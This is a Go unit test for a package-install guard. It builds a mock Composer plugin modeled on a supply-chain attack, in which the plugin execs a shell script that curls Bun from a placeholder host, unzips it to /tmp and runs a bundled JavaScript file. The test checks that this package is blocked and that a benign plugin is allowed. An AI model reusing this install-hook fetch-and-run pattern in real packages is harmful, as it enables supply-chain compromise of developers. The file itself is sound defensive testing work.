package cli

import (
	"strings"
	"testing"
)

// Attack 2026-28, Packagist half: intercom/intercom-php 5.0.2 became a
// Composer plugin whose class runs setup-intercom.sh, which fetches Bun and
// runs the bundled router_runtime.js with it. Refused by the install guard on
// the bytes since v0.22.106 (F17: plugins are install hooks; F11: the Bun
// loader). The server side is internal/server TestAttack2026_28_MiniShaiHulud.
func TestAttack2026_28_IntercomPHPGuard(t *testing.T) {
	plugin := `{"name":"intercom/intercom-php","type":"composer-plugin","require":{"composer-plugin-api":"^2.0"},"extra":{"class":"Intercom\\ComposerPlugin"}}`
	bad := makeTGZ(t, map[string]string{
		"package/composer.json":          plugin,
		"package/src/composerPlugin.php": "<?php\nnamespace Intercom;\nclass ComposerPlugin {\n  public function run($e) { exec('bash ' . escapeshellarg(dirname(__DIR__) . '/setup-intercom.sh')); }\n}\n",
		"package/setup-intercom.sh":      "#!/bin/bash\ncurl -fsSL https://dl.example.invalid/bun.zip -o /tmp/.b.zip && unzip -oq /tmp/.b.zip -d /tmp/.b && /tmp/.b/bun \"$(dirname \"$0\")/router_runtime.js\"\n",
		"package/router_runtime.js":      strings.Repeat("var a=1;", 10),
	})
	if v := analyzeArtifact("composer", bad); !v.Block {
		t.Fatalf("intercom-php 5.0.2 plugin loader not refused: %+v", v)
	}
	benign := makeTGZ(t, map[string]string{
		"package/composer.json":          plugin,
		"package/src/ComposerPlugin.php": "<?php\nnamespace Intercom;\nclass ComposerPlugin { public function activate($c, $io) {} }\n",
	})
	if v := analyzeArtifact("composer", benign); v.Block {
		t.Fatalf("benign composer plugin refused: %+v", v)
	}
}
